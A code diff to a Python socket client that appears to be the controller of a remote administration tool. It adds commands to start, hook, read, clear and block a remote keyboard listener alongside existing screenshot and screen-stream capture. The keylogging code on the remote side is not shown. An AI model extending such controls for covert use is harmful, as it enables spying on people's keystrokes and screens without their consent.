@@ -62,6 +62,31 @@ class Client(Socket, threading.Thread):
         DEBUG("received screenshot")
         self.ui_cmd("save-image", img,'screen')
 
+    def task_keyboard_start(self):
+        self.send_str("listener-start")
+
+    def task_keyboard_stop(self):
+        self.send_str("listener-stop")
+
+    def task_hook(self):
+        self.send_str("listener-hook")
+
+    def task_unhook(self):
+        self.send_str("listener-unhook")
+
+    def task_log_clear(self):
+        self.send_str("listener-clear")
+
+    def task_log_get(self):
+        self.send_str("listener-get")
+        self.ui_cmd("update-log", self.recv_str(), "keyboard")
+
+    def task_keyboard_block(self):
+        self.send_str("listener-block")
+
+    def task_keyboard_unblock(self):
+        self.send_str("listener-unblock")
+
     def run(self):
         while True:
             task = self.socket_queue.get()
@@ -78,6 +103,10 @@ class Client(Socket, threading.Thread):
                 self.task_update_stream(ext)
             elif cmd == "capture-stream":
                 self.task_capture_stream()
+            elif cmd == 'listener-start':
+                self.task_keyboard_start()
+            elif cmd == 'listener-stop':
+                self.task_keyboard_stop()
             elif cmd == "listener-hook":
                 self.task_hook()
             elif cmd == "listener-unhook":
@@ -86,24 +115,10 @@ class Client(Socket, threading.Thread):
                 self.task_log_clear()
             elif cmd == "listener-get":
                 self.task_log_get()
-
-    def task_log_get(self):
-        self.send_str("listener-get")
-        log = self.recv_str()
-        self.ui_cmd("update-log", log, "keyboard")
-
-    def task_log_clear(self):
-        self.send_str("listener-clear")
-
-    def task_unhook(self):
-        self.send_str("listener-unhook")
-        self.ui_cmd("hook", ui='keyboard')
-
-    def task_hook(self):
-        self.send_str("listener-hook")
-        self.ui_cmd("unhook", ui='keyboard')
-
-
+            elif cmd == 'listener-block':
+                self.task_keyboard_block()
+            elif cmd == 'listener-unblock':
+                self.task_keyboard_unblock()
 
 def DEBUG(*args,**kwargs):
     print("Client:", *args,**kwargs)
